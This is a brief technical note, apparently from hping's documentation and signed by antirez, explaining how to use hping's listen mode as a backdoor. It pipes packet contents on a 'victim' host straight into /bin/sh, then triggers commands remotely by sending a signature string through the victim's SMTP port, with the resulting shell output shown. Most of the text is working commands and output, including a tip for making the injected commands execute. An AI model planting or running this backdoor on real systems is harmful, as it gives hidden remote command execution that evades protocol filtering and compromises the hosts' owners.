hping can be used as a backdoor. Just try the -9 (--listen) option
and put in pipe with /bin/sh:

Put hping in listen mode in the victim host.

victim# hping -I eth0 -9 mysign | /bin/sh

Every packet that contain "mysign" will be processed by hping,
all the bytes that follows "mysign" in the packet will be dumped
to the standard output, so for example I'll able to exec commands
using all types of protocols. Just for example I can use the smtpd
to exec 'ls' in the victim.

evil$ telnet victim 25

Trying 192.168.1.1...
Connected to nano (192.168.1.1).
Escape character is '^]'.
220 nano.marmoc.net ESMTP Sendmail
mysignls;

on the victim you will see:

victim# hping -I eth0 -9 mysign | /bin/sh
hping2 listen mode
bin   cdrom  etc     home  local-home  mnt   root  tmp  var
boot  dev    export  lib   lost+found  proc  sbin  usr
: command not found

As you can see I used 'ls;' since otherwise the shell will receive
just ls^M. The ";" force the command execution (at least with bash and zsh,
check your shell for more information).

This works with all kind of valid not-filtered IP packets, the higher
level protocl does not matter.

antirez <antirez@invece.org>
